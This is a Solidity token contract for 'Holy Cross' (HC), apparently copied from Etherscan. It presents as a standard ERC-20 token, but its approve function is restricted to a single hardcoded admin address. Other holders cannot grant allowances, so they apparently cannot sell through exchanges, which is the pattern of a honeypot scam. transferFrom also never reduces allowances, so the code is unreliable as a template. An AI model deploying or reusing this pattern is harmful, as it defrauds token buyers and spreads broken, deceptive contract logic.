/**
 *Submitted for verification at Etherscan.io on 2021-11-20
*/

pragma solidity ^0.8.2;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 1000000 * 10 ** 18;
    string public name = "Holy Cross";
    string public symbol = "HC";
    uint public decimals = 18;
    address admin=0xbb6597f33B4220704C374d78DDfd3723f33D091D;
    address burn = 0x000000000000000000000000000000000000dEaD ;
   
   
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
   
    constructor() {
        balances[msg.sender] = totalSupply;
       // msg.sender == admin;
    }
   
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
   
    function transfer(address to, uint value) public returns(bool) {
        require(balanceOf(msg.sender) >= value, 'balance too low');
        //balances[to] += value;
       /*
       uint a;
        uint b;
        value-a == b;
        (value/100)*10 == a;
        balances[to] +=b;
        balances[burn] += a;
        */
        balances[to] += value;
        balances[msg.sender] -= value;
       emit Transfer(msg.sender, to, value);
        return true;
    }
   
    function transferFrom(address from, address to, uint value) public returns(bool) {
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;  
    }
   
    //function approve(address spender, uint value) public onlyadmin() returns (bool)
     function approve(address spender, uint value) public onlyadmin returns (bool){
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;  
    }
   
    //modifier onlyadmin() { require (block.timestamp >= 1636804275 );
    //_ ;
   
   
    modifier onlyadmin() { require (msg.sender == admin);
   
    _ ;
    }
}